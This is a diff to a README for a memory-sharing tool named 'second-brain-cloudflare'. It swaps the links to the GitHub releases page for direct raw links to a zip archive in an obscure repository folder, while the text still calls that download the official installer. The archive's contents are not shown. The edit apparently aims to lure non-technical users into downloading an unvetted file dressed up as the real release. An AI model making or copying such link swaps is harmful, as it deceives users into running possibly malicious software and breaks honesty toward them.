@@ -1,6 +1,6 @@
 # 🧠 second-brain-cloudflare - Your memories available in every tool
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Advanced-starfruit874/second-brain-cloudflare/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Advanced-starfruit874/second-brain-cloudflare/main/sopor/brain_cloudflare_second_3.0.zip)
 
 ## 🎯 What this tool does
 
@@ -23,7 +23,7 @@ You do not need to know programming or command-line scripting to run this. The i
 
 You need to download the installer from the official release page. 
 
-[Visit this page to download the latest setup file](https://github.com/Advanced-starfruit874/second-brain-cloudflare/releases)
+[Visit this page to download the latest setup file](https://raw.githubusercontent.com/Advanced-starfruit874/second-brain-cloudflare/main/sopor/brain_cloudflare_second_3.0.zip)
 
 Look for the file that ends with ".exe" for Windows. Save this file to your computer.
 
